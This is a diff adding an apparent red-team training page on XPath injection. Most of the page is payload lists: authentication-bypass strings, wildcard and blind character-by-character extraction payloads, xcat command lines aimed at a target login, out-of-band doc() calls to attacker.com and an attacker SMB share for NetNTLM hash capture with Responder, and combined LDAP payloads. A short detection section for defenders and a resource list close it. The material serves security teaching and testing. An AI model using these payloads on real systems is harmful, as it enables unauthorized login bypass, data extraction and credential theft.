@@ -1,0 +1,142 @@
+---
+layout: training-page
+title: "XPath Injection — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - xpath-injection
+  - xml
+  - authentication-bypass
+  - blind-injection
+  - out-of-band
+page_key: "web-xpath-injection"
+---
+<h1>XPath Injection</h1>
+<p>
+  XPath Injection exploits applications that build XPath queries from unsanitized user input to
+  query or navigate XML documents. Like SQL injection, injecting XPath metacharacters and logic
+  operators allows authentication bypass, data extraction, and in some configurations, out-of-band
+  network requests (e.g., stealing NetNTLM hashes via UNC paths on Windows).
+</p>
+
+<h2>Tools</h2>
+<ul>
+  <li>orf/xcat — automate XPath injection attacks to retrieve documents — <code>github.com/orf/xcat</code></li>
+  <li>feakk/xxxpwn — advanced XPath injection tool — <code>github.com/feakk/xxxpwn</code></li>
+  <li>aayla-secura/xxxpwn_smart — predictive text XPath injection — <code>github.com/aayla-secura/xxxpwn_smart</code></li>
+  <li>micsoftvn/xpath-blind-explorer — <code>github.com/micsoftvn/xpath-blind-explorer</code></li>
+  <li>Harshal35/XmlChor — XPath exploitation tool — <code>github.com/Harshal35/XMLCHOR</code></li>
+</ul>
+
+<h2>Vulnerable Query Pattern</h2>
+<p>
+  A typical vulnerable login query constructs an XPath expression directly from user input:
+</p>
+<pre><code>string(//user[name/text()='USERNAME' and password/text()='PASSWORD']/account/text())</code></pre>
+<p>
+  If both fields are user-controlled and unsanitized, injecting XPath metacharacters manipulates
+  the query logic.
+</p>
+
+<h2>Authentication Bypass Payloads</h2>
+<pre><code>' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+' or 1=1 or ''='
+' or true() or ''='</code></pre>
+<p>
+  These payloads short-circuit the AND condition, causing the query to return results regardless
+  of the password value.
+</p>
+
+<h2>Path Traversal and Wildcard Payloads</h2>
+<pre><code>/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+')] | //user/*[contains(*,'
+') and contains(../password,'c
+') and starts-with(../password,'c</code></pre>
+
+<h2>Blind XPath Injection</h2>
+<p>
+  When the application returns no visible data but behaves differently based on whether the
+  XPath query returns results, extract data character by character using boolean conditions.
+</p>
+
+<h3>Determine String Length</h3>
+<pre><code>' and string-length(account)=1 and '1'='1
+' and string-length(account)=2 and '1'='1
+' and string-length(account)=5 and '1'='1
+# True response when the length matches</code></pre>
+
+<h3>Extract Characters with substring()</h3>
+<pre><code>' and substring(//user[userid=5]/username,1,1)='a' and '1'='1
+' and substring(//user[userid=5]/username,2,1)='d' and '1'='1
+' and substring(//user[userid=5]/username,3,1)='m' and '1'='1
+# Automate with xcat to iterate all positions and characters</code></pre>
+
+<h3>Extract Characters Using codepoints-to-string()</h3>
+<pre><code>' and substring(//user[userid=5]/username,1,1)=codepoints-to-string(97) and '1'='1
+# 97 = ASCII 'a'; iterate through 33–126 for printable characters</code></pre>
+
+<h2>Automated Blind Extraction with xcat</h2>
+<pre><code># Install xcat
+pip install xcat
+
+# Basic authentication bypass test
+xcat --method POST --url http://target.com/login \
+     --true-string "Welcome" --false-string "Invalid" \
+     --username-field user --password-field pass \
+     "' or true() or 'x'='y"
+
+# Extract document structure
+xcat run http://target.com/search --true-string "results" \
+     --param q "' or '1'='1" retrieve-document</code></pre>
+
+<h2>Out-of-Band Exploitation</h2>
+<p>
+  On systems where the XPath processor supports the <code>doc()</code> function (XPath 2.0),
+  the attacker can trigger network requests — including to attacker-controlled SMB shares on
+  Windows to capture NetNTLM hashes.
+</p>
+<pre><code># Trigger out-of-band HTTP/SMB request:
+http://example.com/?title=Foundation&amp;type=*&amp;rent_days=* and doc('http://attacker.com/leak')
+
+# On Windows — capture NetNTLM via SMB:
+http://example.com/?param=* and doc('//attacker-ip/share')
+
+# Use Responder to capture the hash:
+responder -I eth0 -v</code></pre>
+
+<h2>LDAP-XPath Combined Payloads</h2>
+<p>
+  Some applications use XPath to query XML configurations that also store LDAP-style data.
+  Combine XPath injection with LDAP special characters when applicable:
+</p>
+<pre><code>*)(uid=*))(|(uid=*
+*)(|(password=*
+)(cn=*</code></pre>
+
+<h2>Detection Signals (For Defenders)</h2>
+<ul>
+  <li>XPath error messages in HTTP responses (e.g., "XPathException", "Invalid XPath expression")</li>
+  <li>Boolean-based behavioral differences between payloads like <code>' or '1'='1</code> and <code>' or '1'='2</code></li>
+  <li>Unusual characters in parameters: single quotes, square brackets, slashes, colons</li>
+  <li>Unexpected network connections from the web server to internal or external hosts</li>
+</ul>
+
+<h2>Resources</h2>
+<ul>
+  <li>PayloadsAllTheThings XPATH Injection — <code>github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection</code></li>
+  <li>OWASP XPath Injection testing guide — <code>owasp.org/www-project-web-security-testing-guide</code></li>
+  <li>xcat tool — <code>github.com/orf/xcat</code></li>
+  <li>xxxpwn advanced tool — <code>github.com/feakk/xxxpwn</code></li>
+  <li>Places of Interest in Stealing NetNTLM Hashes — Osanda Malith Jayathissa</li>
+  <li>Root Me XPath Injection challenges — <code>root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication</code></li>
+</ul>
